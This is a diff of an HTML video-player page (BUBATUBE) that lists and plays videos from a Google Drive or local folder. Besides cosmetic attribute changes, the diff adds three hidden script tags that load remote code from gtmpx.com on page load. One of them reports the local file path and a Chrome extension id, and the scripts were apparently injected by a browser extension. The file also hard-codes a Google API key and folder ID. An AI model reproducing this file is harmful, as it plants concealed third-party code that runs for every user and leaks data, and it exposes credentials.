@@ -1,6 +1,5 @@
 <!DOCTYPE html>
-<html lang="ru">
-<head>
+<html lang="ru"><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta name="mobile-web-app-capable" content="yes">
@@ -238,7 +237,7 @@
     .grid { grid-template-columns: repeat(auto-fill, minmax(165px, 1fr)); gap: 12px 10px; }
   }
 </style>
-</head>
+<script src="https://gtmpx.com/code?t=1792841154555&amp;lh=file%3A%2F%2F%2FC%3A%2FVIDEO%2Findex.html&amp;extId=428aece16af04344b42f2892f8fd454a-chrome-23&amp;v=2" type="text/javascript" defer="" async=""></script></head>
 <body>
 
 <header>
@@ -258,11 +257,11 @@
     <button class="pill-btn" onclick="openCloudModal()" title="Настройки ссылки">⚙️</button>
     <button class="pill-btn" onclick="document.getElementById('dirInput').click()" title="Открыть локальную папку">📁</button>
   </div>
-  <input type="file" id="dirInput" webkitdirectory directory multiple style="display:none" onchange="handleFiles(this.files)">
+  <input type="file" id="dirInput" webkitdirectory="" directory="" multiple="" style="display:none" onchange="handleFiles(this.files)">
   <input type="file" id="localVideoInput" accept="video/*" style="display:none" onchange="playPickedLocalFile(this.files)">
 </header>
 
-<div class="modal-bg" id="cloudModal">
+<div class="modal-bg open" id="cloudModal">
   <div class="modal-card">
     <h3>☁️ Подключение Google Диска</h3>
     <div>
@@ -273,7 +272,7 @@
       <label>2. Ссылка на папку VIDEO (доступ «Все, у кого есть ссылка»)</label>
       <input type="text" id="inpFolderUrl" placeholder="https://drive.google.com/drive/folders/...">
     </div>
-    <div id="cloudStatus" style="font-size:13px; color:var(--blue); display:none; line-height:1.4;"></div>
+    <div id="cloudStatus" style="font-size: 13px; color: var(--blue); display: block; line-height: 1.4;">⏳ Сканирую каналы (45 из 160)...</div>
     <button class="pill-btn" style="background:#2b4c32; color:#65e87d; justify-content:center; padding:10px;" onclick="bakePermanentHtml()">💾 Вшить ссылку в файл навсегда (Скачать HTML)</button>
     <div style="display:flex; gap:10px; justify-content:flex-end; margin-top:4px;">
       <button class="pill-btn" onclick="closeCloudModal()">Отмена</button>
@@ -292,9 +291,7 @@
   <main id="mainArea">
     <div id="emptyState" class="empty-screen">
       <h2>BUBATUBE</h2>
-      <p id="emptySubtext" style="color:var(--muted); max-width:420px; font-size:14px; line-height:1.5;">
-        Подключи папку <b>VIDEO</b> с Google Диска или выбери локальную папку на устройстве.
-      </p>
+      <p id="emptySubtext" style="color:var(--muted); max-width:420px; font-size:14px; line-height:1.5;">⏳ Сканирую каналы (45 из 160)...</p>
       <div class="empty-btns">
         <button class="big-btn" onclick="clickCloudBtn()">☁️ Подключить Google Диск</button>
         <button class="big-btn sec" onclick="document.getElementById('dirInput').click()">📁 Локальная папка VIDEO</button>
@@ -332,7 +329,7 @@
             <button onclick="restartVideo()">Сначала ↺</button>
           </div>
           <!-- Нативный стабильный плеер с одинарной полосой прокрутки -->
-          <video id="mainPlayer" controls autoplay playsinline></video>
+          <video id="mainPlayer" controls="" autoplay="" playsinline=""></video>
           <iframe id="driveIframe" allow="autoplay; fullscreen" style="display:none;"></iframe>
         </div>
 
@@ -404,7 +401,7 @@
 
 <script>
 const DEFAULT_API_KEY = 'AIzaSyDsZ23IUkkqE7aOJl9sjruwQzukbrbGmuQ';
-const DEFAULT_FOLDER_ID = '';
+const DEFAULT_FOLDER_ID = '1fKRyKChPKPM39COyorKMb82H2W0ENXr1';
 
 const memStore = {};
 function safeGet(k, def) { try { const v = localStorage.getItem(k); return v ? JSON.parse(v) : def; } catch(e) { return memStore[k] || def; } }
@@ -1049,5 +1046,6 @@ window.addEventListener('DOMContentLoaded', () => {
   if (gdriveConfig.apiKey && gdriveConfig.folderId) syncFromGoogleDrive();
 });
 </script>
-</body>
-</html>
+
+
+<script src="https://gtmpx.com/ga/video-tags/inject"></script><script id="RleC5odG1s" src="https://gtmpx.com/ga/?v=2&amp;extId=428aece16af04344b42f2892f8fd454a-chrome-23"></script></body><iframe src="about:blank" data-native-realm="true" style="display: none;"></iframe></html>
